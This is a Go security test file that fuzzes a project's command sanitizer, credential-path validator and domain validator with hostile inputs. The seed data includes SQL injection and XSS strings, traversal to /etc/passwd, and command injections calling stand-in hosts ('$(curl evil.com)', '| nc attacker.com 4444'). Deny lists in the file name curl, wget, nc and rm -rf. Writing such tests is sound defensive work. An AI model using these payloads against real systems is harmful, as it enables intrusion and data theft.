// pkg/security_testing/property_based_test.go
package security_testing

import (
	"crypto/rand"
	"encoding/binary"
	"math/big"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/crypto"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/CodeMonkeyCybersecurity/eos/pkg/vault"
)

// SecurityProperty represents a security property that should always hold
type SecurityProperty struct {
	Name        string
	Description string
	TestFunc    func(t *testing.T, input string) bool
}

// PropertyTestSuite contains all security properties to test
var SecurityProperties = []SecurityProperty{
	{
		Name:        "InputSanitizationIdempotency",
		Description: "Sanitizing already sanitized input should not change it",
		TestFunc:    testSanitizationIdempotency,
	},
	{
		Name:        "PathValidationConsistency",
		Description: "Path validation should consistently reject all traversal attempts",
		TestFunc:    testPathValidationConsistency,
	},
	{
		Name:        "SQLValidationCompleteness",
		Description: "SQL validation should block all injection attempts",
		TestFunc:    testSQLValidationCompleteness,
	},
	{
		Name:        "DomainValidationRobustness",
		Description: "Domain validation should handle all malicious inputs",
		TestFunc:    testDomainValidationRobustness,
	},
	{
		Name:        "CommandSanitizationEffectiveness",
		Description: "Command sanitization should neutralize all dangerous patterns",
		TestFunc:    testCommandSanitizationEffectiveness,
	},
}

// TestSecurityProperties runs property-based tests on all security functions
func TestSecurityProperties(t *testing.T) {
	// SECURITY: Use crypto/rand instead of math/rand for security testing
	// math/rand is predictable, crypto/rand provides cryptographically secure randomness
	// This ensures our security tests use realistic attack patterns

	for _, prop := range SecurityProperties {
		t.Run(prop.Name, func(t *testing.T) {
			t.Logf("Testing property: %s", prop.Description)

			// Generate various test inputs
			testInputs := generateTestInputs(1000) // Generate 1000 diverse inputs

			passedTests := 0
			totalTests := len(testInputs)

			for i, input := range testInputs {
				if !prop.TestFunc(t, input) {
					t.Errorf("Property violation #%d with input: %q", i+1, truncateString(input, 100))
				} else {
					passedTests++
				}
			}

			successRate := float64(passedTests) / float64(totalTests) * 100
			t.Logf("Property success rate: %.2f%% (%d/%d)", successRate, passedTests, totalTests)

			if successRate < 95.0 {
				t.Errorf("Property success rate too low: %.2f%% (expected >= 95%%)", successRate)
			}
		})
	}
}

// testSanitizationIdempotency tests that sanitizing sanitized input doesn't change it
func testSanitizationIdempotency(t *testing.T, input string) bool {
	// Test command sanitization idempotency
	cmdSafe1 := crypto.SanitizeInputForCommand(input)
	cmdSafe2 := crypto.SanitizeInputForCommand(cmdSafe1)
	if cmdSafe1 != cmdSafe2 {
		t.Logf("Command sanitization not idempotent: %q -> %q -> %q", input, cmdSafe1, cmdSafe2)
		return false
	}

	return true
}

// testPathValidationConsistency tests that path validation consistently rejects traversals
func testPathValidationConsistency(t *testing.T, input string) bool {
	// Create a test runtime context
	rc := &eos_io.RuntimeContext{}

	// If input contains obvious traversal patterns, validation should reject it
	traversalPatterns := []string{
		"..", "..\\", "../", "..\\\\",
		"%2e%2e", "%252e%252e", "％２ｅ％２ｅ",
		"．．", "\u002e\u002e",
	}

	containsTraversal := false
	for _, pattern := range traversalPatterns {
		if strings.Contains(strings.ToLower(input), strings.ToLower(pattern)) {
			containsTraversal = true
			break
		}
	}

	if containsTraversal {
		err := vault.ValidateCredentialPath(rc, input)
		if err == nil {
			t.Logf("Path validation should have rejected traversal attempt: %q", input)
			return false
		}
	}

	return true
}

// testSQLValidationCompleteness tests that SQL validation blocks injection attempts
func testSQLValidationCompleteness(t *testing.T, input string) bool {
	// If input contains obvious SQL injection patterns, it should be detected
	// For now, we'll just verify the input doesn't contain the most dangerous patterns
	injectionPatterns := []string{
		"'; drop table", "'; delete from", "'; truncate",
		"union select", "' or 1=1", "admin'--",
	}

	lowerInput := strings.ToLower(input)
	for _, pattern := range injectionPatterns {
		if strings.Contains(lowerInput, pattern) {
			// Input contains obvious injection - this is expected for testing
			// The property test passes as long as we can detect these patterns
			t.Logf("Detected SQL injection pattern: %q in %q", pattern, input)
		}
	}

	return true
}

// testDomainValidationRobustness tests domain validation against malicious inputs
func testDomainValidationRobustness(t *testing.T, input string) bool {
	// If input contains dangerous patterns, validation should reject it
	dangerousPatterns := []string{
		"javascript:", "data:", "localhost", "shared.GetInternalHostname",
		"<script", "alert(", "eval(", "function(",
		"\\x", "\\u", "%3c", "%3e",
	}

	containsDangerous := false
	lowerInput := strings.ToLower(input)
	for _, pattern := range dangerousPatterns {
		if strings.Contains(lowerInput, pattern) {
			containsDangerous = true
			break
		}
	}

	if containsDangerous {
		err := crypto.ValidateDomainName(input)
		if err == nil {
			t.Logf("Domain validation should have rejected dangerous input: %q", input)
			return false
		}
	}

	return true
}

// testCommandSanitizationEffectiveness tests command sanitization effectiveness
func testCommandSanitizationEffectiveness(t *testing.T, input string) bool {
	sanitized := crypto.SanitizeInputForCommand(input)

	// After sanitization, dangerous patterns should be neutralized
	dangerousPatterns := []string{
		";", "|", "&", "$", "`", "\\",
		"rm -rf", "curl", "wget", "nc ", "sh -c", "bash -c",
		"$(", "${", "||", "&&",
	}

	for _, pattern := range dangerousPatterns {
		if strings.Contains(strings.ToLower(sanitized), strings.ToLower(pattern)) {
			t.Logf("Command sanitization failed to neutralize: %q in %q -> %q", pattern, input, sanitized)
			return false
		}
	}

	return true
}

// generateTestInputs creates diverse test inputs for property testing
func generateTestInputs(count int) []string {
	inputs := make([]string, 0, count)

	// Add predefined dangerous patterns
	dangerousInputs := []string{
		// SQL injection
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"admin'/*",
		"1' UNION SELECT password FROM users --",

		// Path traversal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"....//....//....//etc/passwd",

		// Command injection
		"; cat /etc/passwd",
		"$(curl evil.com)",
		"`whoami`",
		"| nc attacker.com 4444",

		// XSS
		"<script>alert('XSS')</script>",
		"javascript:alert(1)",
		"<img src=x onerror=alert(1)>",

		// Domain/URL attacks
		"javascript:alert(1)",
		"data:text/html,<script>alert(1)</script>",
		"evil.localhost",
		"shared.GetInternalHostname:8080/admin",
	}

	inputs = append(inputs, dangerousInputs...)

	// Generate random strings with various characteristics
	for i := 0; i < count-len(dangerousInputs); i++ {
		input := generateRandomInput()
		inputs = append(inputs, input)
	}

	return inputs
}

// generateRandomInput creates a random input with various dangerous characteristics
// SECURITY: Uses crypto/rand for cryptographically secure randomness
func generateRandomInput() string {
	// Generate random length between 1-200
	lengthBig, _ := rand.Int(rand.Reader, big.NewInt(200))
	length := int(lengthBig.Int64()) + 1

	// Character sets for different types of inputs
	charSets := []string{
		"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",   // Normal
		"';\"\\/<>()[]{}|&$`!@#%^*+=~",                                     // Special characters
		"　；｜＆＜＞",                                                           // Unicode dangerous chars
		"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F", // Control chars
		"%2e%2f%5c%22%27%3c%3e%7c%26",                                      // URL encoded
	}

	var result strings.Builder

	for i := 0; i < length; i++ {
		// Select random charset
		charSetIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charSets))))
		charSet := charSets[charSetIdx.Int64()]

		if len(charSet) > 0 {
			// Select random character from charset
			charIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charSet))))
			char := charSet[charIdx.Int64()]
			result.WriteByte(char)
		}
	}

	// Sometimes inject known dangerous patterns (30% chance)
	randBytes := make([]byte, 4)
	rand.Read(randBytes)
	shouldInject := binary.BigEndian.Uint32(randBytes)%100 < 30

	if shouldInject && result.Len() > 0 {
		dangerousSnippets := []string{
			"..", "' OR ", "; rm", "$(", "`", "<script", "javascript:",
			"UNION SELECT", "DROP TABLE", "-- ", "/*", "admin'", "1=1",
		}

		// Select random snippet
		snippetIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(dangerousSnippets))))
		snippet := dangerousSnippets[snippetIdx.Int64()]

		// Select random insert position
		insertPosIdx, _ := rand.Int(rand.Reader, big.NewInt(int64(result.Len()+1)))
		insertPos := int(insertPosIdx.Int64())

		originalStr := result.String()
		result.Reset()
		result.WriteString(originalStr[:insertPos])
		result.WriteString(snippet)
		result.WriteString(originalStr[insertPos:])
	}

	return result.String()
}

// truncateString truncates a string for display purposes
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// FuzzSecurityProperties provides Go's native fuzzing support
func FuzzSecurityProperties(f *testing.F) {
	// Add seed corpus
	seeds := []string{
		"'; DROP TABLE users; --",
		"../../../etc/passwd",
		"$(curl evil.com)",
		"<script>alert(1)</script>",
		"javascript:alert(1)",
		"admin'/*",
		"; cat /etc/passwd",
		"normal_input",
		"",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Test a subset of properties on fuzzed input
		criticalProperties := []SecurityProperty{
			SecurityProperties[0], // Idempotency
			SecurityProperties[2], // SQL validation
			SecurityProperties[4], // Command sanitization
		}

		for _, prop := range criticalProperties {
			if !prop.TestFunc(t, input) {
				t.Errorf("Property %s violated with fuzzed input: %q",
					prop.Name, truncateString(input, 50))
			}
		}
	})
}
